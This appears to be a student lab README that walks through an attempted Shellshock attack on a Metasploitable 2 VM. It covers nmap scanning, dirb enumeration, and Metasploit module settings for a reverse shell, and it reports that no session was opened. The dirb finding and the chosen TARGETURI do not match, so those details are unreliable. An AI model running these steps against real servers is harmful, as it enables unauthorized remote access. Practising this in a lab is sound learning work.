
# **Shellshock Exploitation Using Metasploit**

## **Overview**

This project demonstrates how to exploit the **Shellshock** vulnerability in a target system using the **Metasploit Framework**. Specifically, we focus on exploiting the **Apache mod_cgi** component running on the target machine to gain remote access through **CGI scripts**.

**Shellshock** is a vulnerability in the **Bash shell** that allows remote code execution through **malformed environment variables**. This exploit leverages a vulnerable **CGI script** running on an Apache server, which can execute arbitrary commands via the vulnerable Bash environment.

## **Target Machine**

The target system in this scenario is **Metasploitable 2**, a vulnerable virtual machine intentionally created for testing and learning purposes. It runs multiple services including FTP, SSH, HTTP, etc., and is used here to demonstrate the **Shellshock** exploit.

### **Target Details**

- **IP Address:** `192.168.71.129`
- **Open Ports:**
  - Port 21 (FTP)
  - Port 22 (SSH)
  - Port 80 (HTTP - Apache HTTPD)
  - Other various services (Telnet, SMTP, etc.)

## **Tools Used**

- **Metasploit Framework** (`msfconsole`)
- **Nmap** for port scanning and service detection
- **Dirb** for directory and file enumeration on the web server

## **Steps**

### 1. **Scan the Target System for Open Ports**

To begin, we used **Nmap** to scan the target system and identify open ports and the services running on those ports.

```bash
sudo nmap 192.168.71.129 -sV -O -p1-4500
```

This command scans ports **1-4500** and provides service versions and OS details. The scan revealed that **Port 80** (HTTP) is open and running **Apache HTTPD**, which is vulnerable to the **Shellshock** exploit when running certain **CGI scripts**.

### 2. **Directory and File Enumeration Using `dirb`**

We used the **`dirb`** tool to perform directory and file enumeration on the web server at **Port 80** (Apache HTTPD). This helped us identify the presence of potentially vulnerable CGI scripts.

```bash
dirb http://192.168.71.129/cgi-bin/
```

The output showed a potential CGI script at `/cgi-bin/php`, which we later targeted for exploitation.

### 3. **Metasploit: Searching for Shellshock Exploit**

Once the vulnerable CGI script was identified, we used **Metasploit Framework** (`msfconsole`) to search for an appropriate exploit targeting the **Shellshock** vulnerability in Apache.

```bash
msf6 > search shellshock
```

We found the **`apache_mod_cgi_bash_env_exec`** exploit, which is designed to target CGI scripts that invoke the **Bash shell**. This exploit uses the **Shellshock** vulnerability to execute arbitrary code on the target system.

### 4. **Configure Metasploit and Set Exploit Parameters**

We configured the Metasploit exploit by setting the following options:

```bash
set RHOSTS 192.168.71.129     # Target IP address
set RPORT 80                  # Apache HTTPD runs on port 80
set TARGETURI /cgi-bin/hello_world.sh  # CGI script URL
set LHOST <your_local_ip>     # Your local IP address for reverse shell
set LPORT 4444                # Local port for reverse shell listener
```

### 5. **Execute the Exploit**

With all configurations in place, we executed the exploit:

```bash
exploit
```

If the exploit is successful, **Metasploit** should create a reverse shell or **Meterpreter** session. However, no session was created in this attempt, possibly due to incorrect configurations or firewall settings on the target system.

### 6. **Troubleshooting**

If no session was created, possible reasons include:

- **Firewall/IDS/IPS** blocking the reverse connection
- Incorrect **TARGETURI** or **LPORT** configuration
- **CGI script** not vulnerable to **Shellshock**
- Port **4444** not open or misconfigured on the local system

### 7. **Scan for Open Ports on Local System (LPORT)**

To ensure that the **LPORT** is available for listening, we used the following command to list open ports on the local machine:

```bash
sudo ss -tuln
```

If no output is shown, it may indicate that there are no services actively listening for incoming connections on your system. In such cases, try using alternative ports like **8080**, **4444**, or others that are free.

## **Conclusion**

This exercise demonstrated how to exploit the **Shellshock** vulnerability via a vulnerable **CGI script** hosted on an **Apache HTTPD** server. Using **Metasploit**, we were able to configure and attempt exploitation, though success was not achieved due to configuration issues and firewall restrictions.

## **Future Work**

To improve this process:

1. **Verify vulnerability** by testing with different CGI scripts.
2. **Configure firewall and IDS** to allow reverse shell connections.
3. **Explore other Shellshock-based exploits** targeting different configurations and systems.
